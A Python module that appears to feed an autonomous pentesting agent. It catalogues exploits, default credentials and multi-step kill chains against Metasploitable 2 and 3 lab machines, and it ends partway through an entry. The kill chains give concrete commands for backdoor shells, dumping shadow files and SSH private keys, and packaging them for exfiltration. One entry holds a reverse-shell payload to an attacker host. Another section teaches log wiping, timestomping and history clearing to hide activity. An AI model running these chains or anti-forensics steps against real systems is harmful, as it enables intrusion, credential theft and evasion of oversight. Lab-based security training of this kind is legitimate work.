#!/usr/bin/env python3
"""
core/knowledge/knowledge_packs.py — ARIASKA Knowledge Packs v1.0

Single source of truth for all target-specific exploitation knowledge.
Consumed by SmartMentor, PlaybookBuilder, SkillLibrary seeder, and
the PPO phase-appropriateness reward shaper.

Each knowledge pack contains:
- services: port → vulnerability → exploitation path
- kill_chains: ordered multi-step attack sequences
- credentials: default/known credentials per service
- cves: CVE → description → tool/module
- reasoning: WHY each attack works (for PPO understanding injection)

Author: Filip Volf + Claude (knowledge engineering)
"""

import logging
from dataclasses import dataclass, field
from typing import Dict, List, Any, Optional

logger = logging.getLogger("ariaska.knowledge_packs")


# =============================================================================
# Data structures
# =============================================================================

@dataclass(frozen=True)
class ServiceVuln:
    """A vulnerable service on a target."""
    port: int
    service: str
    version: str
    vulnerability: str
    cve: str
    exploitation: str              # How to exploit it
    reasoning: str                 # WHY this works (for PPO understanding)
    impact: str                    # What you get (root, user, info)
    difficulty: str                # easy, medium, hard
    tags: tuple = ()


@dataclass(frozen=True)
class KillChain:
    """An ordered multi-step attack sequence with reasoning."""
    name: str
    description: str
    target_profile: str
    difficulty: str
    steps: tuple                   # Tuple of KillChainStep
    total_expected_reward: float = 0.0
    reasoning: str = ""            # WHY this chain works as a whole


@dataclass(frozen=True)
class KillChainStep:
    """A single step in a kill chain with reasoning."""
    phase: str
    command: str
    description: str
    reasoning: str                 # WHY this step, WHY now, WHY this tool
    expected_output: str
    success_indicator: str
    next_if_success: str = ""
    next_if_fail: str = ""


@dataclass(frozen=True)
class Credential:
    """A known credential for a service."""
    service: str
    port: int
    username: str
    password: str
    access_level: str              # root, admin, user, service
    reasoning: str                 # WHY these creds exist (default install, backdoor, etc.)


@dataclass(frozen=True)
class CVEEntry:
    """A CVE with exploitation details."""
    cve_id: str
    service: str
    description: str
    module: str                    # Metasploit module or command
    impact: str
    reasoning: str                 # WHY the vuln exists (design flaw, misconfiguration, etc.)


# =============================================================================
# METASPLOITABLE 2 KNOWLEDGE PACK
# Complete exploitation knowledge for Ubuntu 8.04 (Metasploitable 2)
# =============================================================================

MS2_SERVICES: Dict[int, ServiceVuln] = {
    21: ServiceVuln(
        port=21, service="vsftpd", version="2.3.4",
        vulnerability="Backdoor command execution",
        cve="CVE-2011-2523",
        exploitation="exploit/unix/ftp/vsftpd_234_backdoor → connect to port 6200 for root shell",
        reasoning="vsftpd 2.3.4 was compromised at source level. Sending ':)' as username triggers "
                  "a backdoor that opens a bind shell on port 6200. This is NOT a bug — it's a "
                  "deliberate backdoor inserted into the source tarball. The agent should recognize "
                  "the version string and immediately exploit rather than waste time on FTP enumeration.",
        impact="root", difficulty="easy",
        tags=("backdoor", "ftp", "instant-root"),
    ),
    22: ServiceVuln(
        port=22, service="OpenSSH", version="4.7p1",
        vulnerability="Default credentials + weak key generation",
        cve="CVE-2008-0166",
        exploitation="ssh msfadmin@TARGET (password: msfadmin) OR use predictable PRNG keys",
        reasoning="Metasploitable ships with default msfadmin:msfadmin credentials. OpenSSH 4.7p1 on "
                  "Debian was affected by the predictable PRNG bug (CVE-2008-0166) making SSH keys "
                  "guessable. The agent should try default creds FIRST, then key-based attacks. "
                  "SSH gives a stable interactive shell, making it ideal for post-exploitation.",
        impact="user→root via sudo", difficulty="easy",
        tags=("ssh", "default-creds", "weak-crypto"),
    ),
    23: ServiceVuln(
        port=23, service="Telnet", version="Linux telnetd",
        vulnerability="Default credentials, cleartext protocol",
        cve="N/A",
        exploitation="telnet TARGET → msfadmin:msfadmin",
        reasoning="Telnet transmits everything in cleartext, but more importantly, Metasploitable "
                  "accepts default credentials. The agent should use telnet as a quick shell when SSH "
                  "is too slow or when demonstrating credential-based access. After login, `sudo su` "
                  "gives root because msfadmin has full sudo privileges.",
        impact="user→root", difficulty="easy",
        tags=("telnet", "default-creds", "cleartext"),
    ),
    25: ServiceVuln(
        port=25, service="Postfix", version="smtpd",
        vulnerability="Open relay + user enumeration via VRFY/EXPN",
        cve="N/A",
        exploitation="smtp-user-enum -M VRFY -U users.txt -t TARGET",
        reasoning="SMTP VRFY command reveals valid usernames on the system. This is an information "
                  "disclosure that feeds credential attacks — once you know valid users, you can "
                  "target specific accounts for brute force or credential stuffing. The agent should "
                  "use this in ENUMERATION phase to build a user list before exploitation.",
        impact="info-disclosure", difficulty="easy",
        tags=("smtp", "user-enum", "info-disclosure"),
    ),
    80: ServiceVuln(
        port=80, service="Apache", version="2.2.8",
        vulnerability="Multiple web apps: DVWA, phpMyAdmin, Mutillidae, TWiki",
        cve="Multiple",
        exploitation="dirb/gobuster for path discovery → SQLi in DVWA → file inclusion → shell upload",
        reasoning="Apache hosts multiple intentionally vulnerable web applications. DVWA has SQL "
                  "injection, command injection, file upload, and LFI/RFI vulns at various security "
                  "levels. phpMyAdmin may allow unauthenticated access to MySQL. The agent should "
                  "enumerate web paths first (dirb/gobuster), then try SQL injection or file upload "
                  "for shell access. Web attacks are lower-priority than service backdoors but "
                  "demonstrate diverse attack capability.",
        impact="shell→root", difficulty="medium",
        tags=("web", "sqli", "lfi", "file-upload"),
    ),
    111: ServiceVuln(
        port=111, service="rpcbind", version="2",
        vulnerability="NFS share enumeration via RPC",
        cve="N/A",
        exploitation="rpcinfo -p TARGET → discover NFS, then showmount -e TARGET",
        reasoning="rpcbind maps RPC services. It reveals NFS exports which can be mounted remotely. "
                  "The agent should query rpcbind to discover NFS, then mount the root filesystem "
                  "to plant SSH keys for persistent root access. This is a 3-step chain: "
                  "rpcinfo → showmount → mount + SSH key plant.",
        impact="info→root", difficulty="medium",
        tags=("rpc", "nfs", "enumeration"),
    ),
    139: ServiceVuln(
        port=139, service="Samba", version="3.0.20-Debian",
        vulnerability="Username map script command injection",
        cve="CVE-2007-2447",
        exploitation="exploit/multi/samba/usermap_script → root shell",
        reasoning="Samba 3.0.20 has a critical command injection in the 'username map script' "
                  "configuration option. By sending a specially crafted username containing shell "
                  "metacharacters, we get arbitrary command execution as root. This is one of the "
                  "most reliable MS2 exploits — it requires NO credentials and gives instant root. "
                  "The agent should try this early in EXPLOITATION phase alongside ingreslock.",
        impact="root", difficulty="easy",
        tags=("smb", "rce", "instant-root"),
    ),
    445: ServiceVuln(
        port=445, service="Samba", version="3.0.20-Debian",
        vulnerability="Same as port 139 — SMB over TCP",
        cve="CVE-2007-2447",
        exploitation="Same usermap_script exploit works on 445",
        reasoning="Port 445 is the direct SMB TCP port (vs 139 which uses NetBIOS). Same exploit "
                  "applies. The agent should know that 139 and 445 are the same Samba service and "
                  "not waste time scanning both independently.",
        impact="root", difficulty="easy",
        tags=("smb", "rce"),
    ),
    512: ServiceVuln(
        port=512, service="rexec", version="rexecd",
        vulnerability="No authentication required for remote execution",
        cve="N/A",
        exploitation="rexec -l root TARGET command",
        reasoning="The r-services (rexec, rlogin, rsh) are legacy Unix remote access services that "
                  "rely on trust-based authentication (.rhosts files). On MS2 they accept root "
                  "connections without passwords. The agent should know these are INSTANT ROOT access "
                  "but are often blocked in medium/hard difficulty presets because they're too easy.",
        impact="root", difficulty="easy",
        tags=("r-services", "no-auth", "instant-root"),
    ),
    513: ServiceVuln(
        port=513, service="rlogin", version="rlogind",
        vulnerability="No authentication, root trust",
        cve="N/A",
        exploitation="rlogin -l root TARGET",
        reasoning="rlogin trusts the remote host via .rhosts. On MS2, root trust is enabled. "
                  "This gives instant root login with no password. Same family as rexec/rsh.",
        impact="root", difficulty="easy",
        tags=("r-services", "no-auth", "instant-root"),
    ),
    514: ServiceVuln(
        port=514, service="rsh", version="rshd",
        vulnerability="No authentication for remote shell",
        cve="N/A",
        exploitation="rsh -l root TARGET command",
        reasoning="Remote shell with root trust. Instant command execution as root. All three "
                  "r-services (512-514) should be attempted together in EXPLOITATION phase.",
        impact="root", difficulty="easy",
        tags=("r-services", "no-auth", "instant-root"),
    ),
    1099: ServiceVuln(
        port=1099, service="Java RMI", version="GNU Classpath",
        vulnerability="Deserialization RCE via RMI registry",
        cve="Multiple",
        exploitation="exploit/multi/misc/java_rmi_server → shell",
        reasoning="Java RMI registries often have deserialization vulnerabilities. The Metasploit "
                  "module exploits the default RMI registry to achieve remote code execution. "
                  "This is a reliable exploit but requires Metasploit — the agent should prefer "
                  "simpler backdoors first, then try this if they're blocked.",
        impact="root", difficulty="medium",
        tags=("java", "rmi", "deserialization", "rce"),
    ),
    1524: ServiceVuln(
        port=1524, service="ingreslock", version="backdoor",
        vulnerability="Bindshell backdoor — instant root, no exploit needed",
        cve="N/A",
        exploitation="telnet TARGET 1524 → immediate root shell",
        reasoning="Port 1524 runs a bindshell backdoor left from a previous compromise simulation. "
                  "Simply connecting via telnet gives an immediate root shell with NO authentication, "
                  "NO exploit, NO credentials. This is the FASTEST path to root on MS2. The agent "
                  "should learn: 'if port 1524 is open, connect immediately — this is free root.' "
                  "In medium/hard difficulty, this port is blocked to force more sophisticated attacks.",
        impact="root", difficulty="easy",
        tags=("backdoor", "bindshell", "instant-root", "fastest"),
    ),
    2049: ServiceVuln(
        port=2049, service="NFS", version="2-4",
        vulnerability="World-readable root filesystem export",
        cve="N/A",
        exploitation="showmount -e TARGET → mount -t nfs TARGET:/ /mnt → plant SSH key",
        reasoning="NFS exports the root filesystem (/) to everyone (*). This means we can mount "
                  "the entire target filesystem, read /etc/shadow for password hashes, and write "
                  "our SSH public key to /root/.ssh/authorized_keys for persistent root access. "
                  "This is a 3-step chain: showmount → mount → SSH key write → SSH login as root. "
                  "The agent should recognize NFS as a PATH TO ROOT, not just information disclosure.",
        impact="root", difficulty="medium",
        tags=("nfs", "mount", "ssh-key-plant", "persistence"),
    ),
    2121: ServiceVuln(
        port=2121, service="ProFTPD", version="1.3.1",
        vulnerability="Default anonymous access, potential command injection",
        cve="N/A",
        exploitation="ftp TARGET 2121 → anonymous login → explore writable dirs",
        reasoning="ProFTPD on MS2 allows anonymous login. While it doesn't give direct shell, "
                  "writable directories can be used to plant backdoors or scripts that other "
                  "services might execute.",
        impact="file-access", difficulty="medium",
        tags=("ftp", "anonymous", "file-write"),
    ),
    3306: ServiceVuln(
        port=3306, service="MySQL", version="5.0.51a",
        vulnerability="No root password — unauthenticated root access",
        cve="N/A",
        exploitation="mysql -h TARGET -u root → SELECT * FROM mysql.user; → INTO OUTFILE for webshell",
        reasoning="MySQL on MS2 has NO ROOT PASSWORD. This means `mysql -h TARGET -u root` gives "
                  "immediate database admin access. From MySQL root, the agent can: (1) dump all "
                  "databases for credentials, (2) write a PHP webshell via SELECT INTO OUTFILE to "
                  "Apache's webroot, (3) read system files via LOAD_FILE(). The agent should learn "
                  "that 'MySQL no password' is not just a database vuln — it's a PATH TO SHELL.",
        impact="db-admin→shell", difficulty="easy",
        tags=("mysql", "no-password", "db-admin", "webshell"),
    ),
    3632: ServiceVuln(
        port=3632, service="distccd", version="distccd v1",
        vulnerability="Remote code execution via distcc daemon",
        cve="CVE-2004-2687",
        exploitation="exploit/unix/misc/distcc_exec → daemon user shell → privesc",
        reasoning="distcc is a distributed compilation daemon that can execute arbitrary commands. "
                  "The exploit gives a shell as the 'daemon' user, which then requires privilege "
                  "escalation to root. This is a medium-value target — useful when easy paths are "
                  "blocked in hard difficulty mode.",
        impact="user→root", difficulty="medium",
        tags=("distcc", "rce", "privesc-needed"),
    ),
    5432: ServiceVuln(
        port=5432, service="PostgreSQL", version="8.3.0",
        vulnerability="Default credentials + COPY FROM PROGRAM RCE",
        cve="N/A",
        exploitation="psql -h TARGET -U postgres -W (password: postgres) → COPY ... FROM PROGRAM 'cmd'",
        reasoning="PostgreSQL on MS2 accepts default postgres:postgres credentials. Once authenticated, "
                  "the COPY ... FROM PROGRAM command executes arbitrary OS commands as the postgres "
                  "user. This is a 2-step exploit: authenticate → command execution. The agent should "
                  "learn that PostgreSQL RCE via COPY FROM PROGRAM is a standard technique, applicable "
                  "to many real-world targets beyond MS2.",
        impact="user→root", difficulty="medium",
        tags=("postgresql", "default-creds", "rce", "copy-from-program"),
    ),
    5900: ServiceVuln(
        port=5900, service="VNC", version="VNC protocol 3.3",
        vulnerability="Weak password: 'password'",
        cve="N/A",
        exploitation="vncviewer TARGET → password: password → desktop access",
        reasoning="VNC uses the trivially guessable password 'password'. This gives full desktop "
                  "access, which is useful for demonstrating GUI-based attacks but less useful for "
                  "automated command-line pentesting. The agent should prefer shell-based access.",
        impact="desktop-access", difficulty="easy",
        tags=("vnc", "weak-password", "gui"),
    ),
    6667: ServiceVuln(
        port=6667, service="UnrealIRCd", version="3.2.8.1",
        vulnerability="Backdoor command execution",
        cve="CVE-2010-2075",
        exploitation="exploit/unix/irc/unreal_ircd_3281_backdoor → root shell",
        reasoning="UnrealIRCd 3.2.8.1 had a backdoor inserted into the source distribution. "
                  "Sending 'AB;' followed by a command to the IRC server executes it as root. "
                  "This is another 'instant root via backdoor' path, similar to vsftpd and ingreslock. "
                  "The agent should learn: IRC daemons on uncommon versions may contain backdoors. "
                  "In hard difficulty, this exploit is blocked to force multi-step attacks.",
        impact="root", difficulty="easy",
        tags=("irc", "backdoor", "instant-root"),
    ),
    8009: ServiceVuln(
        port=8009, service="Apache Jserv", version="AJP 1.3",
        vulnerability="AJP protocol file read / SSRF (GhostCat-like)",
        cve="CVE-2020-1938",
        exploitation="ajpshooter.py TARGET 8009 → read web.xml → extract credentials",
        reasoning="AJP (Apache JServ Protocol) can be exploited to read arbitrary files from the "
                  "web application or to perform SSRF. On MS2, it connects to Tomcat and can read "
                  "configuration files containing credentials.",
        impact="info-disclosure→creds", difficulty="medium",
        tags=("ajp", "ghostcat", "file-read"),
    ),
    8180: ServiceVuln(
        port=8180, service="Apache Tomcat", version="5.5",
        vulnerability="Default credentials → WAR deploy → shell",
        cve="N/A",
        exploitation="curl http://TARGET:8180/manager → tomcat:tomcat → deploy WAR payload → shell",
        reasoning="Tomcat manager application accepts default tomcat:tomcat credentials. Through "
                  "the manager, we can deploy a WAR file containing a JSP webshell. This is a "
                  "3-step chain: (1) authenticate to manager, (2) deploy malicious WAR, (3) trigger "
                  "webshell for command execution. The agent should learn that 'Tomcat + default creds "
                  "= guaranteed shell' — this pattern appears in MANY real-world engagements.",
        impact="shell→root", difficulty="medium",
        tags=("tomcat", "default-creds", "war-deploy", "webshell"),
    ),
}

MS2_CREDENTIALS: List[Credential] = [
    Credential("SSH", 22, "msfadmin", "msfadmin", "user→root(sudo)", 
               "Default Metasploitable user. Has full sudo privileges → `sudo su` for root."),
    Credential("Telnet", 23, "msfadmin", "msfadmin", "user→root(sudo)",
               "Same default credentials work on telnet. Cleartext but functional."),
    Credential("MySQL", 3306, "root", "", "db-admin",
               "MySQL root has NO PASSWORD. Direct unauthenticated database admin access."),
    Credential("PostgreSQL", 5432, "postgres", "postgres", "db-user→rce",
               "Default postgres credentials. COPY FROM PROGRAM gives OS command execution."),
    Credential("Tomcat", 8180, "tomcat", "tomcat", "app-admin→shell",
               "Tomcat manager default creds. WAR deploy gives arbitrary code execution."),
    Credential("VNC", 5900, "N/A", "password", "desktop",
               "VNC password is literally 'password'. Gives full desktop GUI access."),
    Credential("FTP", 21, "msfadmin", "msfadmin", "user",
               "FTP accepts default credentials. Limited to file operations."),
    Credential("FTP-anon", 2121, "anonymous", "", "file-read",
               "ProFTPD allows anonymous login. Browse files, look for sensitive data."),
]

MS2_CVES: List[CVEEntry] = [
    CVEEntry("CVE-2011-2523", "vsftpd 2.3.4", "Backdoor in vsftpd source distribution",
             "exploit/unix/ftp/vsftpd_234_backdoor", "root",
             "Source code was trojaned. Sending ':)' in username field triggers backdoor on port 6200."),
    CVEEntry("CVE-2007-2447", "Samba 3.0.20", "Username map script command injection",
             "exploit/multi/samba/usermap_script", "root",
             "MS-RPC endpoint allows shell metacharacters in username field during SMB session setup."),
    CVEEntry("CVE-2010-2075", "UnrealIRCd 3.2.8.1", "Trojaned source with command execution backdoor",
             "exploit/unix/irc/unreal_ircd_3281_backdoor", "root",
             "Source code distribution was compromised. 'AB;cmd' triggers arbitrary command execution."),
    CVEEntry("CVE-2004-2687", "distccd", "distcc daemon allows arbitrary command execution",
             "exploit/unix/misc/distcc_exec", "daemon-user",
             "distcc protocol has no authentication. Any compilation request executes on the server."),
    CVEEntry("CVE-2008-0166", "OpenSSL/OpenSSH", "Predictable PRNG in Debian OpenSSL",
             "ssh_key_bruteforce with debian-weak-keys", "user/root",
             "Debian's OpenSSL had only 32,768 possible keys. All can be precomputed and tested."),
    CVEEntry("CVE-2012-1823", "PHP-CGI", "PHP CGI argument injection",
             "exploit/multi/http/php_cgi_arg_injection", "www-data",
             "PHP in CGI mode allows passing command-line arguments via query string."),
]

MS2_KILL_CHAINS: List[KillChain] = [
    KillChain(
        name="ms2_fastest_root",
        description="Fastest path to root: nmap → ingreslock → dump → exfil → clean",
        target_profile="metasploitable2",
        difficulty="easy",
        reasoning="Ingreslock on port 1524 gives instant root with ZERO exploit complexity. "
                  "This chain teaches the agent that SPEED matters — in a real engagement, "
                  "the fastest root wins. The agent should learn: 'always check for bindshells first.'",
        total_expected_reward=500.0,
        steps=(
            KillChainStep("recon", "nmap -sV -p- {target}", "Full port scan to discover all services",
                          "We scan ALL ports because hidden services (like 1524) are often the easiest wins",
                          "Open ports: 21,22,23,25,80,139,445,512-514,1099,1524,...", "open"),
            KillChainStep("exploitation", "telnet {target} 1524", "Connect to ingreslock backdoor",
                          "Port 1524 is a bindshell — telnet directly gives root. No exploit, no creds needed.",
                          "root@metasploitable:/#", "root@"),
            KillChainStep("post_exploitation", "cat /etc/shadow", "Dump password hashes",
                          "With root shell, dump shadow file for offline cracking. Contains ALL user hashes.",
                          "root:$1$... msfadmin:$1$...", "root:"),
            KillChainStep("exfiltration", "cat /etc/shadow | base64", "Exfiltrate shadow hashes",
                          "Base64 encode for clean transfer. Shadow hashes = proof of complete system compromise.",
                          "cm9vdDokMS...", "base64"),
            KillChainStep("closeout", "rm -f /tmp/ariaska_* && history -c", "Clean up artifacts",
                          "Remove our tools and clear history. Professional engagement cleanup.",
                          "CLOSEOUT_TMP_CLEANED", "CLOSEOUT"),
        ),
    ),
    KillChain(
        name="ms2_samba_chain",
        description="Samba usermap_script → root → credential harvest → lateral → exfil",
        target_profile="metasploitable2",
        difficulty="easy",
        reasoning="Samba CVE-2007-2447 is the most reliable MS2 exploit after ingreslock. "
                  "This chain teaches the agent about service-specific exploits and post-exploitation.",
        total_expected_reward=450.0,
        steps=(
            KillChainStep("recon", "nmap -sV -p 139,445 {target}", "Target Samba service specifically",
                          "Focused scan on SMB ports. Faster than full scan when we know what we want.",
                          "139/tcp open netbios-ssn Samba 3.0.20-Debian", "Samba"),
            KillChainStep("exploitation", "msfconsole -q -x 'use exploit/multi/samba/usermap_script; set RHOSTS {target}; exploit'",
                          "Exploit Samba usermap_script for root",
                          "CVE-2007-2447: shell metacharacters in username → root RCE. No creds needed.",
                          "Command shell session opened", "session"),
            KillChainStep("privilege_escalation", "id && whoami", "Verify root access",
                          "Confirm we have root. usermap_script should give root directly.",
                          "uid=0(root)", "uid=0"),
            KillChainStep("post_exploitation", "cat /etc/shadow && cat /etc/passwd", "Harvest credentials",
                          "Dump both passwd and shadow for complete credential harvest.",
                          "root:$1$... msfadmin:$1$...", "root:"),
            KillChainStep("exfiltration", "tar czf /tmp/loot.tar.gz /etc/shadow /etc/passwd /root/.ssh/",
                          "Package sensitive files for exfiltration",
                          "Bundle all sensitive files. Shadow + passwd + SSH keys = full credential compromise.",
                          "tar: Removing leading /", "tar"),
            KillChainStep("closeout", "rm -f /tmp/loot.tar.gz && history -c", "Clean up and close",
                          "Remove exfil archive and clear shell history. Leave no artifacts.",
                          "CLOSEOUT_TMP_CLEANED", "CLOSEOUT"),
        ),
    ),
    KillChain(
        name="ms2_nfs_to_root",
        description="NFS mount → SSH key plant → persistent root access",
        target_profile="metasploitable2",
        difficulty="medium",
        reasoning="NFS exploitation teaches the agent about multi-step attacks. You can't just "
                  "'run an exploit' — you need to: discover NFS → mount filesystem → write SSH key → "
                  "SSH in as root. This chain is essential for hard-mode where single-step exploits are blocked.",
        total_expected_reward=400.0,
        steps=(
            KillChainStep("recon", "showmount -e {target}", "Check NFS exports",
                          "showmount reveals which directories are shared via NFS. On MS2, '/' is exported to everyone.",
                          "/ *", "/"),
            KillChainStep("enumeration", "mount -t nfs {target}:/ /mnt/ms2 && ls /mnt/ms2/root/",
                          "Mount root filesystem and explore",
                          "Mounting the NFS share gives us READ+WRITE access to the entire filesystem as root.",
                          ".bashrc .profile .ssh", ".ssh"),
            KillChainStep("exploitation", "ssh-keygen -f /tmp/ms2key -N '' && cat /tmp/ms2key.pub >> /mnt/ms2/root/.ssh/authorized_keys",
                          "Generate SSH key and plant it in root's authorized_keys",
                          "By writing our public key to root's authorized_keys via NFS, we create persistent root SSH access.",
                          "Generating public/private rsa key pair", "key pair"),
            KillChainStep("privilege_escalation", "ssh -i /tmp/ms2key root@{target}", "SSH as root using planted key",
                          "SSH in as root using our planted key. This gives a stable, encrypted, persistent root session.",
                          "root@metasploitable:~#", "root@"),
            KillChainStep("post_exploitation", "cat /etc/shadow", "Dump credentials with root access",
                          "Standard post-exploitation: harvest all password hashes for offline cracking.",
                          "root:$1$...", "root:"),
            KillChainStep("closeout", "rm /root/.ssh/authorized_keys.bak && umount /mnt/ms2", "Clean NFS artifacts",
                          "Remove our SSH key and unmount NFS. Clean engagement closure.",
                          "CLOSEOUT_KEYS_REMOVED", "CLOSEOUT"),
        ),
    ),
    KillChain(
        name="ms2_multi_vector",
        description="Full multi-vector assault: 3 simultaneous exploitation paths",
        target_profile="metasploitable2",
        difficulty="medium",
        reasoning="This chain teaches the agent to maintain MULTIPLE attack vectors simultaneously. "
                  "In real engagements, redundancy is key — if one path dies, others remain. "
                  "The agent should learn: 'never rely on a single shell.'",
        total_expected_reward=600.0,
        steps=(
            KillChainStep("recon", "nmap -sV -sC -p- --min-rate 1000 {target}", "Aggressive full scan",
                          "Fast comprehensive scan. --min-rate 1000 speeds up scanning. -sC runs default scripts.",
                          "21/tcp vsftpd 2.3.4... 139/tcp Samba 3.0.20... 1524/tcp bindshell", "open"),
            KillChainStep("exploitation", "telnet {target} 1524", "Vector 1: ingreslock instant root",
                          "Fastest path. Gives root immediately. This is our PRIMARY shell.",
                          "root@metasploitable:/#", "root@"),
            KillChainStep("exploitation", "mysql -h {target} -u root -e 'SELECT user,password FROM mysql.user'",
                          "Vector 2: MySQL no-password credential dump",
                          "Parallel attack on MySQL. Dumps all database credentials for use elsewhere.",
                          "| root | | msfadmin |", "root"),
            KillChainStep("post_exploitation", "cat /etc/shadow && cat /root/.ssh/id_rsa",
                          "Credential harvest via root shell",
                          "Use our root shell to dump shadow hashes AND SSH private keys.",
                          "root:$1$... -----BEGIN RSA PRIVATE KEY-----", "root:"),
            KillChainStep("exfiltration", "cat /etc/shadow | base64 && echo '---' && cat /root/.ssh/id_rsa | base64",
                          "Exfiltrate credentials and keys",
                          "Base64-encode both shadow hashes and SSH keys for clean exfiltration.",
                          "cm9vdDokMS...", "base64"),
            KillChainStep("closeout", "rm -f /tmp/ariaska_* && history -c && echo CLOSEOUT_COMPLETE",
                          "Full cleanup and verification",
                          "Remove all artifacts, clear history, confirm clean state.",
                          "CLOSEOUT_COMPLETE", "CLOSEOUT"),
        ),
    ),
]

MS2_ANTI_FORENSICS_KNOWLEDGE = {
    "description": "Anti-forensics techniques for CLOSEOUT phase on Linux/MS2 targets",
    "reasoning": "Professional red team engagements require cleanup. Anti-forensics demonstrates "
                 "operational security awareness. In training mode, these are executed on controlled "
                 "targets. In assessment mode, they are logged but not executed.",
    "techniques": [
        {
            "name": "Log wiping",
            "commands": ["clear_bash_history", "clear_auth_logs", "clear_wtmp_btmp"],
            "reasoning": "Shell history and auth logs record every command and login. Clearing them "
                         "removes evidence of our activity. In real engagements, this is essential OPSEC.",
        },
        {
            "name": "Timestamp manipulation",
            "commands": ["timestomp_closeout"],
            "reasoning": "File timestamps (mtime, atime, ctime) are forensic artifacts. Timestomping "
                         "makes our modifications blend with original system files. Forensic analysts "
                         "use timeline analysis — timestomping defeats this technique.",
        },
        {
            "name": "Artifact removal",
            "commands": ["remove_uploaded_tools", "cleanup_tmp_artifacts", "shred_sensitive_files"],
            "reasoning": "Tools, payloads, and temporary files in /tmp and /dev/shm are obvious "
                         "indicators of compromise. Removing them is the minimum professional standard.",
        },
        {
            "name": "Connection evidence",
            "commands": ["remove_known_hosts", "clear_ssh_forensics"],
            "reasoning": "SSH known_hosts and connection logs on our machine AND the target record "
                         "the engagement. Cleaning both sides ensures comprehensive trace removal.",
        },
    ],
}


# =============================================================================
# METASPLOITABLE 3 KNOWLEDGE PACK (Ubuntu 14.04 / Windows Server 2008)
# =============================================================================

MS3_SERVICES: Dict[int, ServiceVuln] = {
    21: ServiceVuln(
        port=21, service="ProFTPD", version="1.3.5",
        vulnerability="mod_copy unauthenticated file copy (CVE-2015-3306)",
        cve="CVE-2015-3306",
        exploitation="site cpfr /etc/passwd; site cpto /var/www/html/passwd.txt → read arbitrary files; "
                     "or copy PHP shell into webroot for RCE",
        reasoning="ProFTPD 1.3.5 mod_copy allows unauthenticated SITE CPFR/CPTO commands to copy any "
                  "file to any location. This is NOT just FTP file access — it's arbitrary file write as "
                  "the ProFTPD user. Copy a PHP shell to the webroot = instant RCE without authentication.",
        impact="file-read/rce", difficulty="medium",
        tags=("ftp", "mod_copy", "file-write", "rce"),
    ),
    22: ServiceVuln(
        port=22, service="OpenSSH", version="6.6.1p1",
        vulnerability="Weak credentials + known CVEs",
        cve="Multiple",
        exploitation="ssh vagrant@TARGET (password: vagrant) → sudo privesc",
        reasoning="MS3 ships with vagrant:vagrant default credentials. Unlike MS2's instant backdoors, "
                  "MS3 requires proper privilege escalation after initial access. This teaches the agent "
                  "that not all targets have trivial root paths.",
        impact="user→root", difficulty="medium",
        tags=("ssh", "default-creds", "privesc-needed"),
    ),
    80: ServiceVuln(
        port=80, service="Apache", version="2.4.7",
        vulnerability="Multiple web apps: WordPress, phpMyAdmin, Drupal",
        cve="Multiple",
        exploitation="wpscan → SQLi/Plugin RCE → shell upload",
        reasoning="MS3's web stack is more modern than MS2. WordPress with vulnerable plugins, "
                  "Drupal with Drupalgeddon, and phpMyAdmin with default creds. The agent needs to "
                  "enumerate CMS versions and find specific plugin vulns — not just run dirb blindly.",
        impact="shell", difficulty="medium",
        tags=("web", "wordpress", "drupal", "cms"),
    ),
    139: ServiceVuln(
        port=139, service="Samba", version="4.x",
        vulnerability="Multiple: symlink traversal, writable shares, credential reuse",
        cve="Multiple",
        exploitation="smbclient -L //TARGET -N → enum shares; smbclient //TARGET/share -U vagrant → "
                     "access writable shares; mount -t cifs //TARGET/share /mnt → browse filesystem; "
                     "or exploit CVE-2017-7494 (SambaCry) if version < 4.6.4 for RCE",
        reasoning="MS3 Samba 4.x is more hardened than MS2's 3.0.20 but still has attack surface. "
                  "Writable shares allow planting webshells/cron jobs. Credential reuse (vagrant:vagrant) "
                  "gives authenticated share access. SambaCry (EternalRed) gives unauthenticated RCE if "
                  "a writable share exists and the version is < 4.6.4.",
        impact="file-access/rce", difficulty="medium",
        tags=("smb", "samba", "share-enum", "cred-reuse"),
    ),
    445: ServiceVuln(
        port=445, service="Samba", version="4.x",
        vulnerability="Same as port 139 — SMB direct over TCP",
        cve="Multiple",
        exploitation="enum4linux -a TARGET; smbmap -H TARGET -u vagrant -p vagrant",
        reasoning="Port 445 is SMB over TCP (modern). Same vulnerabilities as 139 but preferred path. "
                  "enum4linux and smbmap give comprehensive enumeration including shares, users, and policies.",
        impact="info/file-access", difficulty="easy",
        tags=("smb", "enumeration"),
    ),
    3000: ServiceVuln(
        port=3000, service="Ruby on Rails", version="varies",
        vulnerability="Rails deserialization / debug console",
        cve="CVE-2013-0156",
        exploitation="Exploit Rails XML parameter parsing → RCE",
        reasoning="Ruby on Rails has had critical deserialization vulnerabilities. MS3 may expose "
                  "a vulnerable Rails app. The agent should check for debug mode and XML endpoints.",
        impact="shell", difficulty="hard",
        tags=("rails", "deserialization", "rce"),
    ),
    3306: ServiceVuln(
        port=3306, service="MySQL", version="5.5+",
        vulnerability="Weak root password or UDF exploitation",
        cve="N/A",
        exploitation="mysql -h TARGET -u root -p → UDF plugin for OS command execution",
        reasoning="MS3's MySQL may have a weak password rather than no password. Once in, "
                  "User Defined Functions (UDF) can execute OS commands. This is more realistic "
                  "than MS2's open root access.",
        impact="db-admin→rce", difficulty="medium",
        tags=("mysql", "udf", "privesc"),
    ),
    6667: ServiceVuln(
        port=6667, service="UnrealIRCd", version="3.2.8.1",
        vulnerability="Backdoor command execution (CVE-2010-2075)",
        cve="CVE-2010-2075",
        exploitation="exploit/unix/irc/unreal_ircd_3281_backdoor → root shell; "
                     "or manual: connect to 6667, send 'AB;bash -i >& /dev/tcp/ATTACKER/4444 0>&1'",
        reasoning="UnrealIRCd 3.2.8.1 has a backdoor injected into the source tarball. Sending 'AB;' "
                  "followed by a command triggers arbitrary code execution as the IRCd process user. "
                  "This is identical to the MS2 UnrealIRCd vuln — same version, same backdoor. "
                  "The agent should recognize this as a HIGH-PRIORITY instant shell vector.",
        impact="shell→root", difficulty="easy",
        tags=("irc", "backdoor", "instant-shell", "rce"),
    ),
    8020: ServiceVuln(
        port=8020, service="ManageEngine", version="Desktop Central",
        vulnerability="Authentication bypass + RCE",
        cve="CVE-2015-8249",
        exploitation="Exploit authentication bypass → upload agent → RCE",
        reasoning="ManageEngine Desktop Central has multiple critical vulns. This teaches the agent "
                  "about enterprise management software as attack vectors.",
        impact="system", difficulty="medium",
        tags=("manageengine", "auth-bypass", "rce"),
    ),
    8080: ServiceVuln(
        port=8080, service="Apache Tomcat", version="8.0+",
        vulnerability="Default creds + WAR deploy or Struts RCE",
        cve="CVE-2017-5638",
